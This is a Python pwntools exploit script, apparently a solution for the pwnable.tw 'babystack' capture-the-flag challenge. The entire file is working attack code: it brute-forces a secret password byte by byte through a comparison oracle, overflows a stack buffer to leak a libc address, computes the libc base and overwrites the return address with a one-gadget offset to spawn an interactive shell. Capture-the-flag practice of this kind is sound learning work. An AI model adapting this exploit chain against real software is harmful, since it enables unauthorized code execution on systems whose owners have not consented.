```py
from pwn import *
import time
exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

gdbscript = """
breakrva 0xfc1
breakrva 0x102b
c
del breakpoints
breakrva 0x1051
"""
def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10205)
    env = {"LD_PRELOAD": libc.path}
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript)
        time.sleep(2)
    return r

p = conn()


p.sendafter(b">> ", b"1")
p.sendafter(b"passowrd :", b"\x01")

#input()
##bruteforce first 8 bytes
def check_pass(bt):
    p.sendafter(b">> ", b"1")
    p.sendlineafter(b"passowrd :", bt)
    x = p.recvline().decode()
    if "Failed" in x:
        return False
    ##reset login
    p.sendafter(b">> ", b"1")
    return True
buff = b""
for i in range(16):
    found = False
    for j in range(1, 255):
        if check_pass(buff+p8(j)):
            buff += p8(j)
            found=True
            break
    if not found:
        buff += p8(0)
print(buff.hex())


## now we will modify the buffer upto to fill it with A's until next useful ptr.


## overwrite buffer
p.sendlineafter(b">> ", b"1")
p.sendafter(b"passowrd :", flat(
    b"\x00",  
    b"a"*0x3f, ##now buff is filled
    b"a"*0x8
))
p.sendlineafter(b">> ", b"3")
p.send(b"aaaaaaaaaaaaaaa")
p.sendafter(b">> ", b"1") #logout
#p.interactive()


m = b"a"*8
for i in range(6):
    for j in range(1, 255):
        if check_pass(m+p8(j)):
            m += p8(j)
            break

print(m.hex())

libc.address = u64(bytes.ljust(m[8:], 8, b"\x00")) - 492601
log.info(f"libc base - {hex(libc.address)}")

#p.sendafter(b">> ", b"1") #logout
context.log_level="debug"
p.sendlineafter(b">> ", b"1")
p.sendafter(b"passowrd :", flat(
    b"\x00",  
    b"a"*0x3f, ##now buff is filled
    buff,
    #b"a"*16,
    b"a"*16,
    b"a"*8, #EBP
    p64(libc.address + 0x45216)#p64(libc.sym.system)
))
p.sendlineafter(b">> ", b"3")
p.send(b"aaaaaaaaaaaaaaa")

p.sendafter(b">> ", b"2")
## try and fix buffer back and overwrite RBP
p.interactive()
```